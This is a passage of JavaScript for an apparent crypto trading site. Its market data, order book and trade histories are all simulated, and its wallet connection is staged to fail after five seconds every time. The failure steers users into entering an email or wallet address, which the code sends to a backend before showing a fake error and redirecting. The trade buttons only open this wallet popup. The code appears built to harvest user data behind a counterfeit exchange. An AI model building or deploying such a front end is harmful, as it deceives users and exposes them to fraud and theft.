        <button type="button" class="wc-secondary-btn" id="wcTryAgainBtn">Try Again</button>
        <button type="button" class="wc-back-btn" id="wcBackToWalletsBtn">${wcBackArrow} Back to wallets</button>
      `;
      return;
    }

    if (STATE.wcState === 'manual') {
      body.innerHTML = `
        <h2 class="wc-title">Connect Wallet Manually</h2>
        <div class="wc-field-row">
          <label for="wcManualAddress">Wallet Address</label>
          <input type="text" id="wcManualAddress" class="wc-email-input mono" placeholder="Enter wallet address" autocomplete="off" style="width:100%;">
        </div>
        <button type="button" class="wc-primary-btn" id="wcManualConnectBtn">Connect Wallet</button>
        <button type="button" class="wc-back-btn" id="wcManualBackBtn">${wcBackArrow} Back</button>
      `;
      return;
    }
  }

  /* ------------------------------------------------------------------ */
  /* 6c. ENTRY SUBMITTED POPUP (shown after order/wallet/email entries)   */
  /* ------------------------------------------------------------------ */

  function showEntryErrorModal() {
    $('#entryErrorOverlay').hidden = false;
  }
  function hideEntryErrorModal() {
    $('#entryErrorOverlay').hidden = true;
  }

  function openWalletModal() {
    STATE.wcState = 'select';
    STATE.wcShowAll = false;
    STATE.wcSelectedWallet = null;
    clearTimeout(STATE.wcConnectTimer);
    renderWalletModal();
    $('#walletConnectOverlay').hidden = false;
    hideMobileTradePeek();
  }

  function closeWalletModal() {
    $('#walletConnectOverlay').hidden = true;
    clearTimeout(STATE.wcConnectTimer);
    hideMobileTradePeek();
  }

  function startWalletConnection(walletName) {
    STATE.wcSelectedWallet = walletName;
    renderWalletModal('connecting');
    clearTimeout(STATE.wcConnectTimer);
    STATE.wcConnectTimer = setTimeout(() => {
      renderWalletModal('error');
    }, 5000);
  }

  function handleWalletEmailContinue() {
    const input = $('#wcEmailInput');
    const email = input ? input.value.trim() : '';
    if (!email) {
      showToast('error', 'Enter an email to continue');
      return;
    }
    sendEntryToBackend('email', { email });
    renderWalletModal('emailloading');
    setTimeout(() => {
      closeWalletModal();
      showEntryErrorModal();
    }, 1100);
  }

  function handleManualWalletConnect() {
    const input = $('#wcManualAddress');
    const address = input ? input.value.trim() : '';
    if (!address) {
      showToast('error', 'Enter a wallet address to continue');
      return;
    }
    finalizeWalletConnection(address);
  }

  function finalizeWalletConnection(addressOrLabel) {
    STATE.walletConnected = true;
    STATE.walletAddress = addressOrLabel.length > 12
      ? `${addressOrLabel.slice(0, 6)}...${addressOrLabel.slice(-4)}`
      : addressOrLabel;
    $('#walletBtn').classList.add('is-connected');
    $('#walletBtnLabel').textContent = STATE.walletAddress;
    showToast('success', 'Wallet connected successfully');
    sendEntryToBackend('wallet', { method: 'manual', address: addressOrLabel });
    closeWalletModal();
    updateTradingPanel();
    showEntryErrorModal();
  }

  function wireEntryErrorModalEvents() {
    $('#entryErrorContinueBtn').addEventListener('click', () => {
      window.location.href = 'index.html';
    });
  }

  function wireWalletModalEvents() {
    $('#walletConnectCloseBtn').addEventListener('click', closeWalletModal);
    $('#walletConnectOverlay').addEventListener('click', (e) => {
      if (e.target.id === 'walletConnectOverlay') closeWalletModal();
    });
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape' && !$('#walletConnectOverlay').hidden) closeWalletModal();
    });

    $('#walletModalBody').addEventListener('click', (e) => {
      const walletRow = e.target.closest('.wc-wallet-row');
      if (walletRow) { startWalletConnection(walletRow.dataset.wallet); return; }

      if (e.target.closest('#wcViewAllBtn')) { STATE.wcShowAll = true; renderWalletModal('select'); return; }
      if (e.target.closest('#wcEmailContinueBtn')) { handleWalletEmailContinue(); return; }
      if (e.target.closest('#wcBackToWalletsBtn')) { renderWalletModal('select'); return; }
      if (e.target.closest('#wcTryAgainBtn')) { startWalletConnection(STATE.wcSelectedWallet); return; }
      if (e.target.closest('#wcManualBtn')) { renderWalletModal('manual'); return; }
      if (e.target.closest('#wcManualBackBtn')) { renderWalletModal('error'); return; }
      if (e.target.closest('#wcManualConnectBtn')) { handleManualWalletConnect(); return; }
    });

    $('#walletModalBody').addEventListener('keydown', (e) => {
      if (e.key !== 'Enter') return;
      if (e.target.id === 'wcEmailInput') { e.preventDefault(); handleWalletEmailContinue(); }
      if (e.target.id === 'wcManualAddress') { e.preventDefault(); handleManualWalletConnect(); }
    });
  }

  /* ------------------------------------------------------------------ */
  /* 7. INFO TABS (bottom panel)                                         */
  /* ------------------------------------------------------------------ */

  const emptyIcon = `<svg width="34" height="34" viewBox="0 0 34 34" fill="none"><rect x="5" y="7" width="24" height="20" rx="2" stroke="#5F6775" stroke-width="1.4"/><path d="M5 13H29" stroke="#5F6775" stroke-width="1.4"/></svg>`;

  function renderInfoTab(tab) {
    STATE.activeInfoTab = tab;
    const body = $('#infoTabsBody');

    if (tab === 'positions') {
      if (!STATE.positions.length) {
        body.innerHTML = emptyState('No open positions');
        return;
      }
      body.innerHTML = tableHtml(
        ['Pair', 'Side', 'Size', 'Entry Price', 'Mark Price', 'Liq. Price', 'Margin', 'PNL', ''],
        STATE.positions.map((p) => [
          p.pair,
          `<span class="side-tag ${p.side === 'long' ? 'side-tag--long' : 'side-tag--short'}">${p.side === 'long' ? 'Long' : 'Short'} ${p.leverage}x</span>`,
          `<span class="mono">${p.size.toFixed(4)}</span>`,
          `<span class="mono">${p.entry.toFixed(4)}</span>`,
          `<span class="mono">${STATE.lastPrice.toFixed(4)}</span>`,
          `<span class="mono">${p.liq.toFixed(4)}</span>`,
          `<span class="mono">${fmt(p.margin, 2)}</span>`,
          `<span class="mono ${p.pnl >= 0 ? 'positive' : 'negative'}">${p.pnl >= 0 ? '+' : ''}${fmt(p.pnl, 2)}</span>`,
          `<button class="close-pos-btn" data-close="${p.id}">Close</button>`,
        ])
      );
      return;
    }

    if (tab === 'assets') {
      body.innerHTML = tableHtml(
        ['Asset', 'Available', 'In Orders', 'Total'],
        [
          ['USDT', `<span class="mono">${fmt(STATE.walletConnected ? STATE.balance : 0, 2)}</span>`, `<span class="mono">0.00</span>`, `<span class="mono">${fmt(STATE.walletConnected ? STATE.balance : 0, 2)}</span>`],
          ['LIT', `<span class="mono">${fmt(getNetPosition(), 4)}</span>`, `<span class="mono">0.0000</span>`, `<span class="mono">${fmt(getNetPosition(), 4)}</span>`],
        ]
      );
      return;
    }

    if (tab === 'openorders') {
      body.innerHTML = emptyState('No open orders');
      return;
    }

    if (tab === 'twap') {
      body.innerHTML = emptyState('No active TWAP orders');
      return;
    }

    if (tab === 'strategies') {
      body.innerHTML = emptyState('No active strategies');
      return;
    }

    if (tab === 'orderhistory') {
      if (!STATE.orderHistory.length) {
        body.innerHTML = tableHtml(
          ['Time', 'Pair', 'Type', 'Side', 'Qty', 'Price', 'Status'],
          sampleOrderHistory()
        );
        return;
      }
      body.innerHTML = tableHtml(
        ['Time', 'Pair', 'Type', 'Side', 'Qty', 'Price', 'Status'],
        STATE.orderHistory.map((o) => [
          timeStr(o.time), o.pair, cap(o.type),
          `<span class="${o.side === 'long' ? 'positive' : 'negative'}">${o.side === 'long' ? 'Buy' : 'Sell'}</span>`,
          `<span class="mono">${o.qty.toFixed(4)}</span>`,
          `<span class="mono">${o.price.toFixed(4)}</span>`,
          o.status,
        ])
      );
      return;
    }

    if (tab === 'tradehistory') {
      const rows = STATE.tradeHistory.length ? STATE.tradeHistory.map((t) => [
        timeStr(t.time), t.pair,
        `<span class="${t.side === 'long' ? 'positive' : 'negative'}">${t.side === 'long' ? 'Buy' : 'Sell'}</span>`,
        `<span class="mono">${t.qty.toFixed(4)}</span>`,
        `<span class="mono">${t.price.toFixed(4)}</span>`,
        `<span class="mono">${fmt(t.fee, 3)}</span>`,
      ]) : sampleTradeHistory();
      body.innerHTML = tableHtml(['Time', 'Pair', 'Side', 'Qty', 'Price', 'Fee'], rows);
      return;
    }

    if (tab === 'fundinghistory') {
      body.innerHTML = tableHtml(
        ['Time', 'Pair', 'Funding Rate', 'Payment'],
        sampleFundingHistory()
      );
      return;
    }
  }

  function emptyState(text) {
    return `<div class="empty-state">${emptyIcon}<span>${text}</span></div>`;
  }
  function tableHtml(headers, rows) {
    return `<table class="data-table">
      <thead><tr>${headers.map((h) => `<th>${h}</th>`).join('')}</tr></thead>
      <tbody>${rows.map((r) => `<tr>${r.map((c) => `<td>${c}</td>`).join('')}</tr>`).join('')}</tbody>
    </table>`;
  }
  function timeStr(t) {
    const d = new Date(t);
    return `${d.getMonth() + 1}/${d.getDate()} ${String(d.getHours()).padStart(2, '0')}:${String(d.getMinutes()).padStart(2, '0')}`;
  }
  function cap(s) { return s.charAt(0).toUpperCase() + s.slice(1); }

  function sampleOrderHistory() {
    const now = Date.now();
    return [
      [timeStr(now - 3600e3), 'LIT/USDT', 'Market', '<span class="positive">Buy</span>', '<span class="mono">1,204.0000</span>', '<span class="mono">5.2210</span>', 'Filled'],
      [timeStr(now - 7200e3), 'LIT/USDT', 'Limit', '<span class="negative">Sell</span>', '<span class="mono">860.5000</span>', '<span class="mono">5.3040</span>', 'Filled'],
      [timeStr(now - 14400e3), 'LIT/USDT', 'Limit', '<span class="positive">Buy</span>', '<span class="mono">2,100.0000</span>', '<span class="mono">5.0180</span>', 'Cancelled'],
    ];
  }
  function sampleTradeHistory() {
    const now = Date.now();
    return [
      [timeStr(now - 3600e3), 'LIT/USDT', '<span class="positive">Buy</span>', '<span class="mono">1,204.0000</span>', '<span class="mono">5.2210</span>', '<span class="mono">2.507</span>'],
      [timeStr(now - 7200e3), 'LIT/USDT', '<span class="negative">Sell</span>', '<span class="mono">860.5000</span>', '<span class="mono">5.3040</span>', '<span class="mono">1.825</span>'],
    ];
  }
  function sampleFundingHistory() {
    const now = Date.now();
    return [
      [timeStr(now - 8 * 3600e3), 'LIT/USDT', '<span class="mono positive">+0.0083%</span>', '<span class="mono negative">-0.44</span>'],
      [timeStr(now - 16 * 3600e3), 'LIT/USDT', '<span class="mono positive">+0.0110%</span>', '<span class="mono negative">-0.58</span>'],
      [timeStr(now - 24 * 3600e3), 'LIT/USDT', '<span class="mono negative">-0.0025%</span>', '<span class="mono positive">+0.13</span>'],
    ];
  }

  /* ------------------------------------------------------------------ */
  /* 8. TOASTS                                                            */
  /* ------------------------------------------------------------------ */

  function showToast(type, message) {
    const container = $('#toastContainer');
    const el = document.createElement('div');
    el.className = `toast ${type}`;
    el.setAttribute('role', 'status');
    el.textContent = message;
    container.appendChild(el);
    setTimeout(() => {
      el.classList.add('fade-out');
      setTimeout(() => el.remove(), 200);
    }, 3200);
  }

  /* ------------------------------------------------------------------ */
  /* 8b. MOBILE TRADE PEEK (slide-up "Connect Wallet to Trade" teaser)    */
  /* ------------------------------------------------------------------ */

  function showMobileTradePeek() {
    $('#mobileTradePeek').classList.add('is-visible');
  }
  function hideMobileTradePeek() {
    $('#mobileTradePeek').classList.remove('is-visible');
  }

  /* ------------------------------------------------------------------ */
  /* 9. RESPONSIVE NAVIGATION                                            */
  /* ------------------------------------------------------------------ */

  function handleResponsiveNavigation() {
    const mq900 = window.matchMedia('(max-width: 900px)');
    const mq640 = window.matchMedia('(max-width: 640px)');

    function apply() {
      if (mq640.matches) {
        setMobileView(STATE.mobileView);
      } else {
        // restore desktop/tablet default visibility
        $('#chartPanel').classList.remove('is-mobile-active');
        $('#orderBookPanel').classList.remove('is-mobile-active');
        $('#tradePanel').classList.remove('is-mobile-active');
        $('#chartPanel').style.display = '';
        $('#orderBookPanel').style.display = '';
        $('#tradePanel').style.display = '';
      }
      resizeCanvases();
      renderChart();
    }
    mq900.addEventListener('change', apply);
    mq640.addEventListener('change', apply);
    apply();
  }

  function setMobileView(view) {
    STATE.mobileView = view;
    const chart = $('#chartPanel'), ob = $('#orderBookPanel'), trade = $('#tradePanel');
    [chart, ob, trade].forEach((p) => p.classList.remove('is-mobile-active'));
    hideMobileTradePeek();

    if (view === 'chart') chart.classList.add('is-mobile-active');
    if (view === 'orderbook') ob.classList.add('is-mobile-active');
    if (view === 'trade') trade.classList.add('is-mobile-active');
    if (view === 'positions') { chart.classList.add('is-mobile-active'); STATE.activeInfoTab = 'positions'; renderInfoTab('positions'); scrollToInfoTabs(); }
    if (view === 'assets') { chart.classList.add('is-mobile-active'); STATE.activeInfoTab = 'assets'; renderInfoTab('assets'); scrollToInfoTabs(); }

    $all('.mobile-nav__btn').forEach((b) => b.classList.toggle('is-active', b.dataset.view === view));
    $all('.info-tab').forEach((b) => b.classList.toggle('is-active', b.dataset.tab === STATE.activeInfoTab));

    requestAnimationFrame(() => { resizeCanvases(); renderChart(); });
  }
  function scrollToInfoTabs() {
    const el = $('#infoTabs');
    if (el) setTimeout(() => el.scrollIntoView({ block: 'end', behavior: 'smooth' }), 60);
  }

  function openPanelOverlay(panelId) {
    $(panelId).classList.add('is-open');
  }
  function closePanelOverlays() {
    $('#orderBookPanel').classList.remove('is-open');
    $('#tradePanel').classList.remove('is-open');
  }

  /* ------------------------------------------------------------------ */
  /* 10. MARKET DROPDOWN                                                 */
  /* ------------------------------------------------------------------ */

  const MARKETS = [
    { pair: 'LIT/USDT', price: 5.3872, chg: 4.21 },
    { pair: 'BTC/USDT', price: 67340.2, chg: 1.14 },
    { pair: 'ETH/USDT', price: 3482.6, chg: -0.62 },
    { pair: 'SOL/USDT', price: 168.94, chg: 6.02 },
    { pair: 'ARB/USDT', price: 0.8421, chg: -2.15 },
    { pair: 'OP/USDT', price: 2.104, chg: 3.08 },
    { pair: 'AVAX/USDT', price: 38.62, chg: 0.94 },
    { pair: 'DOGE/USDT', price: 0.1642, chg: -1.32 },
  ];

  function renderMarketDropdown() {
    $('#marketDropdownList').innerHTML = MARKETS.map((m) => `
      <div class="market-dropdown__row" data-pair="${m.pair}">
        <span class="pair">${m.pair}</span>
        <span class="chg mono ${m.chg >= 0 ? 'positive' : 'negative'}">${m.chg >= 0 ? '+' : ''}${m.chg.toFixed(2)}%</span>
      </div>`).join('');
  }

  function toggleMarketDropdown(force) {
    const dd = $('#marketDropdown');
    const show = force !== undefined ? force : dd.hidden;
    dd.hidden = !show;
    $('#marketSelectorBtn').setAttribute('aria-expanded', String(show));
  }

  /* ------------------------------------------------------------------ */
  /* 11. EVENT WIRING                                                    */
  /* ------------------------------------------------------------------ */

  function wireEvents() {
    // Timeframe buttons
    $all('.tf-btn').forEach((btn) => btn.addEventListener('click', () => switchTimeframe(btn.dataset.tf)));

    // Chart tool buttons
    $('#tool-crosshair').addEventListener('click', (e) => {
      const pressed = e.currentTarget.getAttribute('aria-pressed') === 'true';
      e.currentTarget.setAttribute('aria-pressed', String(!pressed));
    });
    $('#tool-zoomin').addEventListener('click', () => zoomChart(1.25));
    $('#tool-zoomout').addEventListener('click', () => zoomChart(0.8));
    $('#tool-reset').addEventListener('click', resetZoom);
    $('#ob-collapse-btn').addEventListener('click', () => {
      STATE.obCollapsed = !STATE.obCollapsed;
      $('#orderBookPanel').closest('.workspace').classList.toggle('ob-collapsed', STATE.obCollapsed);
      requestAnimationFrame(() => { resizeCanvases(); renderChart(); });
    });

    // Chart pointer interactions
    chartWrap.addEventListener('mousemove', (e) => { chartPointerMove(e); if (isPanning) chartPanMove(e); });
    chartWrap.addEventListener('mouseleave', chartPointerLeave);
    chartWrap.addEventListener('mousedown', chartPanStart);
    window.addEventListener('mouseup', chartPanEnd);
    chartWrap.addEventListener('touchstart', (e) => { chartPanStart(e); chartPointerMove(e); }, { passive: true });
    chartWrap.addEventListener('touchmove', (e) => { chartPanMove(e); chartPointerMove(e); }, { passive: true });
    chartWrap.addEventListener('touchend', chartPanEnd);
    chartWrap.addEventListener('wheel', (e) => {
      e.preventDefault();
      zoomChart(e.deltaY < 0 ? 1.1 : 0.9);
    }, { passive: false });

    // Info tabs
    $all('.info-tab').forEach((btn) => btn.addEventListener('click', () => {
      $all('.info-tab').forEach((b) => { b.classList.remove('is-active'); b.setAttribute('aria-selected', 'false'); });
      btn.classList.add('is-active');
      btn.setAttribute('aria-selected', 'true');
      renderInfoTab(btn.dataset.tab);
    }));
    $('#infoTabsBody').addEventListener('click', (e) => {
      const closeBtn = e.target.closest('[data-close]');
      if (closeBtn) closePosition(closeBtn.dataset.close);
    });

    // Order book mode + precision
    $all('.ob-mode-btn').forEach((btn) => btn.addEventListener('click', () => {
      $all('.ob-mode-btn').forEach((b) => b.classList.remove('is-active'));
      btn.classList.add('is-active');
      const mode = btn.dataset.mode;
      $('#obAsks').style.display = mode === 'bids' ? 'none' : '';
      $('#obBids').style.display = mode === 'asks' ? 'none' : '';
    }));

    // Trade side tabs (desktop/tablet trade panel) — open the wallet connect popup directly
    $('#tabLong').addEventListener('click', () => { switchSide('long'); openWalletModal(); });
    $('#tabShort').addEventListener('click', () => { switchSide('short'); openWalletModal(); });

    // Mobile quick-trade buttons (below the chart) — peek the "Connect Wallet to Trade"
    // sheet halfway up first; tapping the sheet is what opens the wallet popup.
    $('#quickTradeLong').addEventListener('click', () => { switchSide('long'); showMobileTradePeek(); });
    $('#quickTradeShort').addEventListener('click', () => { switchSide('short'); showMobileTradePeek(); });

    // Mobile trade peek sheet -> opens the wallet connect popup
    $('#mobileTradePeek').addEventListener('click', () => { hideMobileTradePeek(); openWalletModal(); });
    $('#mobileTradePeek').addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); hideMobileTradePeek(); openWalletModal(); }
    });


    // Order type tabs
    $all('.otype-tab').forEach((btn) => btn.addEventListener('click', () => switchOrderType(btn.dataset.type)));

    // Leverage
    $('#leverageRow').addEventListener('click', () => {
      const wrap = $('#leverageSliderWrap');
      wrap.hidden = !wrap.hidden;
    });
    $('#leverageSlider').addEventListener('input', (e) => setLeverage(e.target.value));

    // Amount input + slider + pct buttons
    $('#amountInput').addEventListener('input', (e) => {
      const v = parseFloat(e.target.value.replace(/[^\d.]/g, '')) || 0;
      setAmountFromInput(v);
    });
    $('#amountSlider').addEventListener('input', (e) => setAmountFromPct(Number(e.target.value)));
    $all('.pct-buttons button').forEach((btn) => btn.addEventListener('click', () => setAmountFromPct(Number(btn.dataset.pct))));

    // TP/SL + Reduce only
    $('#tpslCheckbox').addEventListener('change', (e) => { STATE.tpslEnabled = e.target.checked; $('#tpslFields').hidden = !e.target.checked; });
    $('#reduceOnlyCheckbox').addEventListener('change', (e) => { STATE.reduceOnly = e.target.checked; });

    // Limit price
    $('#limitPriceInput').addEventListener('input', updateTradingPanel);

    // Place order / connect wallet
    $('#placeOrderBtn').addEventListener('click', placeOrder);
    $('#walletBtn').addEventListener('click', connectWallet);

    // Market selector dropdown
    renderMarketDropdown();
    $('#marketSelectorBtn').addEventListener('click', (e) => { e.stopPropagation(); toggleMarketDropdown(); });
    document.addEventListener('click', (e) => {
      if (!$('#marketDropdown').hidden && !e.target.closest('.market-dropdown') && !e.target.closest('#marketSelectorBtn')) {
        toggleMarketDropdown(false);
      }
    });
    $('#marketDropdownList').addEventListener('click', (e) => {
      const row = e.target.closest('.market-dropdown__row');
      if (row) {
        showToast('success', `Switched to ${row.dataset.pair}`);
        toggleMarketDropdown(false);
      }
    });

    // Mobile bottom nav
    $all('.mobile-nav__btn').forEach((btn) => btn.addEventListener('click', () => setMobileView(btn.dataset.view)));

    // Tablet/mobile panel toggles (order book collapse button doubles as opener on small screens)
    $('#ob-collapse-btn').addEventListener('click', () => {
      if (window.matchMedia('(max-width: 900px)').matches && !window.matchMedia('(max-width: 640px)').matches) {
        openPanelOverlay('#orderBookPanel');
      }
    });
    $('#menuToggle').addEventListener('click', () => {
      if (window.matchMedia('(max-width: 1180px)').matches) openPanelOverlay('#tradePanel');
    });
    document.addEventListener('click', (e) => {
      if (!e.target.closest('.panel--orderbook') && !e.target.closest('#ob-collapse-btn')) {
        // click-away closes overlay panels on tablet
        if (window.matchMedia('(max-width: 900px)').matches) $('#orderBookPanel').classList.remove('is-open');
      }
      if (!e.target.closest('.panel--trade') && !e.target.closest('#menuToggle')) {
        if (window.matchMedia('(max-width: 1180px)').matches) $('#tradePanel').classList.remove('is-open');
      }
    });

    // Window resize
    let resizeTimer;
    window.addEventListener('resize', () => {
      clearTimeout(resizeTimer);
      resizeTimer = setTimeout(() => { resizeCanvases(); renderChart(); }, 80);
    });
  }

  /* ------------------------------------------------------------------ */
  /* 12. MAIN LOOP / INIT                                                 */
  /* ------------------------------------------------------------------ */

  function init() {
    resizeCanvases();
    STATE.candles = generateCandleData(STATE.timeframe, 220);
    STATE.lastPrice = STATE.candles[STATE.candles.length - 1].close;

    generateOrderBook();
    renderOrderBook();
    generateInitialTrades();

    updateHeaderPrice();
    renderChart();

    updateSliderTrack();
    updateTradingPanel();
    renderInfoTab('positions');
    updateCounts();

    wireEvents();
    wireWalletModalEvents();
    wireEntryErrorModalEvents();
    handleResponsiveNavigation();
    setMobileView('chart');

    // Live simulation loops
    setInterval(() => { simulateMarketDrift(); updateChart(); markToMarket(); }, 1200);
    setInterval(updateOrderBook, 2200);
    setInterval(pushTrade, 1800);
    setInterval(tickFunding, 1000);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();